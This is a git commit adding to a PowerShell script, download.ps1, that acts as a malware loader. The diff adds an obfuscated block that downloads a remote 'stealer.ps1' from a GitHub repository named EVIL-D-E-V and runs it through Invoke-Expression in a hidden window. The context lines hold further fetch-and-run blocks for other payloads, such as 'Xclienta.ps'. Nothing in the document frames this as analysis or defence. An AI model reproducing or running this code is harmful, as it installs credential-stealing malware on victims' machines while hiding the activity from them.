a2ec2f7d1ce8073f991f32f213e99eef336bf7ca
43a1723 <hai1723notgay@gmail.com>
2024-12-04 14:01:23 +0700

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -60,6 +60,10 @@ $shellcode = ("https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/an
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
+$shellcode = ("https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/shellcode/stealer.ps1")
+$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+
 $shellcode = ("https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/shellcode/Xclienta.ps")
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
